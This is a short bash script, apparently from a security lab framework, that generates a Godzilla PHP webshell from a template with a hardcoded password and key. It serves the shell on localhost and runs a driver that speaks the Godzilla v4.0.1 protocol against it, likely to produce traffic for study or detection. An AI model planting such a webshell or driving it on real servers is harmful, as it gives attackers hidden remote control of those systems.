#!/bin/bash
# Godzilla scenario: real Godzilla v4.0.1 PHP protocol against a PHP shell
# generated from the official jar template (base64.bin, pass/key embedded).
# Driver replicates the official php_xor_base64 cryption byte-for-byte.
set +e
OUT="${OUT:-/lab/src/out}"
mkdir -p "$OUT" /var/www/gz

python3 - <<'PY'
tpl = open("/lab/src/framework/drivers/godzilla/assets/shell_template.bin", encoding="utf-8").read()
tpl = tpl.replace("{pass}", "pass").replace("{secretKey}", "godzillakey123456")
open("/var/www/gz/gz.php", "w", encoding="utf-8").write(tpl)
PY

cd /var/www/gz
php -d session.save_path=/tmp -S 127.0.0.1:8080 > "$OUT/gz_php.log" 2>&1 &
PHP=$!
sleep 2

python3 /lab/src/framework/drivers/godzilla/gz_driver.py \
  http://127.0.0.1:8080/gz.php pass godzillakey123456 4 1.5 \
  > "$OUT/gz_drv.log" 2>&1
RC=$?
kill "$PHP" 2>/dev/null
echo "godzilla scenario rc=$RC" >> "$OUT/godzilla.log"
exit 0
